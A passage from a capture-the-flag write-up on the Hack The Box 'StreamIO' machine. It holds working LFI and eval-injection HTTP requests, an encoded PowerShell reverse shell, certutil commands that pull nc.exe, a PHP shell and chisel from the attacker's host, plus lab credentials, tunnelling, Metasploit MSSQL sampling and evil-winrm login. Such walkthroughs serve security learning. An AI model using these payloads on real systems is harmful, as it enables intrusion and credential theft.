# Copyright 2007 James Fisher [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 37ms]
#                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 36ms]
# This work is licensed under the Creative Commons [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 37ms]
index                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 38ms]
master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 32ms]
:: Progress: [81643/81643] :: Job [1/1] :: 1378 req/sec :: Duration: [0:01:10] 
```
None of the functions where able to include the master.php

https://streamio.htb/admin/?message=master.php

Which gave me the idea of fuzzing for additional  ```functions``` - and it worked!
```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "https://streamio.htb/admin/?FUZZ" -b "PHPSESSID=s1idgcea6he98h4v5hrsg97mhs" -fs 1678

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Header           : Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 38ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 1058ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 53ms]
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 47ms]
```
So i tried to include the ```master.php``` with the ```debug``` function, it worked -  but I did not know what master.php was doing, since it only displayed all function on one page.

https://streamio.htb/admin/?debug=master.php

I also checked for ```RFI``` but got no response.
https://streamio.htb/admin/?debug=http://10.10.14.8/test

Lets check for ```LFI``` via ```PHP filters```:
https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

Payload:
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

Base64 String
```
PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==
```
Decoded ```master.php```
```c
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

At the very bottom of the code, there is ```if statement```, that checks if an POST parameter named ```include``` is existent and pushes its contents in a ```eval()``` function, which we can use for code execution.
```c
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
```

I've had a lot of trial and error, because I did not notice the function expects a file. I've eventually noticed when I checked the code again an saw ```file_get_contents()``` called, which is a ```default php function```.

Eventually I've found this git which helped me craft a webshell via LFI and base64 encoded commands.

https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/

Let's craft a request in burp. 

This POC just echos out ```yeebasf``` and it works!

```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 55
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,ZWNobyAieWVlYmFzZiI7
```

```
<form method="POST">
<input name="include" hidden>
</form>
yeebasf		</div>
	</center>
</body>
</html>
```

Lets craft a ```system()``` function to execute code with ```system($_GET['cmd']);```
```
POST /admin/?debug=master.php&cmd=dir HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```

I crafted a powershell b64 encoded reverseshell via revshells.com but as I send the request the application died, so I suspect some kind of ```AV``` is running on the system.

```
POST /admin/?debug=master.php&cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAAyADQAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```

So i decided to got for antoher approach:
```
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ cp  /usr/share/windows-binaries/nc.exe .  
```
https://lolbas-project.github.io/lolbas/Binaries/Certutil/

```
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ python3 -m updog -p 80
[+] Serving /home/kali/htb/streamio/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.10.11.158 - - [28/Jun/2022 22:59:54] "GET /nc.exe HTTP/1.1" 200 -
10.10.11.158 - - [28/Jun/2022 22:59:54] "GET /nc.exe HTTP/1.1" 200 -
```

Request:
```
POST /admin/?debug=master.php&cmd=certutil.exe%20-urlcache%20-split%20-f%20http://10.10.14.8/nc.exe%20nc.exe HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```
```
POST /admin/?debug=master.php&cmd=echo%20%25cd%25 HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```

Returned: ```C:\inetpub\streamio.htb\admin```

Okay, so I was unable to get a reverse shell back from the system using nc, nut sure why. 

```
POST /admin/?debug=master.php&cmd=cmd%20/c%20C:%5Cinetpub%5Cstreamio.htb%5Cadmin%5Cnc.exe%2010.10.14.8 HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```
So I decided to upload a simple windows php reverse shell I've found at 
https://github.com/Dhayalanb/windows-php-reverse-shell
```
POST /admin/?debug=master.php&cmd=certutil.exe%20-urlcache%20-split%20-f%20http://10.10.14.8/shell.php%20shell.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```
 I've tried to load the ```shell.php``` via my browser but got the error:
> WARNING: Failed to daemonise. This is quite common and not fatal. No connection could be made because the target machine actively refused it. (10061)

That was kinda weird, so tried to call the shell via php directly from the box.

I checked some commands and eventually found that php.exe -h gave me some output, so I've called the reverseshell directly via PHP:

```
POST /admin/?debug=master.php&cmd=php.exe%20-h HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```
```
POST /admin/?debug=master.php&cmd=php.exe%20shell2.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```
We got shell:
```
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 1234                                                                                                                      
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.158.
Ncat: Connection from 10.10.11.158:56035.
b374k shell : connected

Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\temp>
```

### Moving Forward

So the weird thing is, we are user ```yoshihide``` but there is no user profile on the system for youshihide but there are two other potential users we could pivot to ```nikk37``` and ```Martin``` - we cant access their user folders.

```
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of C:\Users

02/22/2022  03:48 AM    <DIR>          .
02/22/2022  03:48 AM    <DIR>          ..
02/22/2022  03:48 AM    <DIR>          .NET v4.5
02/22/2022  03:48 AM    <DIR>          .NET v4.5 Classic
02/26/2022  11:20 AM    <DIR>          Administrator
05/09/2022  05:38 PM    <DIR>          Martin
02/26/2022  10:48 AM    <DIR>          nikk37
02/22/2022  02:33 AM    <DIR>          Public
               0 File(s)              0 bytes
               8 Dir(s)   7,264,632,832 bytes free

whoami 
whoami 
streamio\yoshihide

C:\inetpub\streamio.htb\admin>
```

So looking back at the application, we had a ```Login Site```, and we used an ```SQL injection``` to get the user credentials, so somewhere in the code there must be some DB connection strings.

In the index.php, database credentials can be found:
```
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
```

| Username  |  Password |
|---|---|
| db_admin  | B1@hx31234567890  |

No SQL Port is accessible from outside the box.

It's ```chisel``` time!

### Port Forwarding
Provide chisel:
```
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ python3 -m updog -p 80                                                                                                                            130 ⨯
[+] Serving /home/kali/htb/streamio/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.10.11.158 - - [29/Jun/2022 00:07:43] "GET /chisel.exe HTTP/1.1" 200 -
10.10.11.158 - - [29/Jun/2022 00:07:45] "GET /chisel.exe HTTP/1.1" 200 -
```
Retrieve chisel:

```
certutil.exe -urlcache -f -split http://10.10.14.8/chisel.exe chisel.exe
****  Online  ****
  000000  ...
  7d9800
CertUtil: -URLCache command completed successfully.
```

Server setup:
```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ ./chisel server -p 8083 --reverse
2022/06/29 00:06:27 server: Reverse tunnelling enabled
2022/06/29 00:06:27 server: Fingerprint AgY+OIEtvocAZs7zyxq1NUhcyC51tbAxkmmduK8n/Ls=
2022/06/29 00:06:27 server: Listening on http://0.0.0.0:8083
2022/06/29 00:08:35 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
Client setup:
```
.\chisel.exe client 10.10.14.8:8083 R:1080:socks
2022/06/28 20:06:08 client: Connecting to ws://10.10.14.8:8083
2022/06/28 20:06:08 client: Connected (Latency 24.0143ms)
```
We can confirm the sucessully established tunnel by:
```
┌──(kali㉿kali)-[~]
└─$ proxychains4 -q nmap localhost -p 1433                                                                                                            130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 00:14 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.28s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

I've found a post on  https://hackertarget.com/sqlmap-tutorial/ that shows how to use ```sqlmap``` to interact with DBs after getting credentials, I tought that may be interesting to test out.

I was not able to get it running, so i went back to ```hacktricks``` and decided to use ```metasploit```:

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

```
msf6 auxiliary(admin/mssql/mssql_idf) > use auxiliary/admin/mssql/mssql_findandsampledata 
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > options

Module options (auxiliary/admin/mssql/mssql_findandsampledata):

   Name                 Current Setting    Required  Description
   ----                 ---------------    --------  -----------
   KEYWORDS             passw|credit|card  yes       Keywords to search for
   PASSWORD                                no        The password for the specified username
   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                1433               yes       The target port (TCP)
   SAMPLE_SIZE          1                  yes       Number of rows to sample
   TDSENCRYPTION        false              yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                  yes       The number of concurrent threads (max one per host)
   USERNAME             sa                 no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false              yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_findandsampledata) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > set PASSWORD B1@hx31234567890
PASSWORD => B1@hx31234567890
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > set USERNAME db_admin
USERNAME => db_admin
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > run

 
[*] 127.0.0.1:1433        - Attempting to connect to the SQL Server at 127.0.0.1:1433...
[+] 127.0.0.1:1433        - Successfully connected to 127.0.0.1:1433
[*] 127.0.0.1:1433        - Attempting to retrieve data ...
[*] 127.0.0.1:1433        - SQLEXPRESS                    , STREAMIO                      , dbo                           , users                         , password                      , nchar                         , c660060492d9edcaa8332d89c99c92, 30                            
[*] 127.0.0.1:1433        - SQLEXPRESS                    , streamio_backup               , dbo                           , users                         , password                      , nchar                         , 389d14cb8e4e9b94b137deb1caf061, 8                             
[*] 127.0.0.1:1433        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > set KEYWORDS passwd|user
KEYWORDS => passwd|user
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > run

 
[*] 127.0.0.1:1433        - Attempting to connect to the SQL Server at 127.0.0.1:1433...
[+] 127.0.0.1:1433        - Successfully connected to 127.0.0.1:1433
[*] 127.0.0.1:1433        - Attempting to retrieve data ...
[*] 127.0.0.1:1433        - SQLEXPRESS                    , STREAMIO                      , dbo                           , users                         , username                      , nchar                         , James                         , 30                            
[*] 127.0.0.1:1433        - SQLEXPRESS                    , streamio_backup               , dbo                           , users                         , username                      , nchar                         , nikk37                        , 8                             
[*] 127.0.0.1:1433        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_findandsampledata) > 
```

| username  |  password |  hash |
|---|---|---|
| nikk37  |  get_dem_girls2@yahoo.com |389d14cb8e4e9b94b137deb1caf061|

Yay! ```nikk37``` had an Userprofile on the system.

Port ```5985``` aka win-rm was open on our first nmap scan.
Lets try to connect with ```evil-winrm```:

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.158 -u nikk37  -p 'get_dem_girls2@yahoo.com'   

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nikk37\Documents> 
```
We  got ```user.txt```

## Privilege Escalation
### WinPeas
Provide winpeas:
```
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220626/winPEASx64.exe                                                              1 ⨯
--2022-06-29 00:37:53--  https://github.com/carlospolop/PEASS-ng/releases/download/20220626/winPEASx64.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/90e2cea0-071d-4cdd-83ae-0a85bec3871c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220628%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220628T203526Z&X-Amz-Expires=300&X-Amz-Signature=643f89c5a4eded8c01aff882726f22b5ee10ad27313b6963f386e3acf5f51282&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe&response-content-type=application%2Foctet-stream [following]
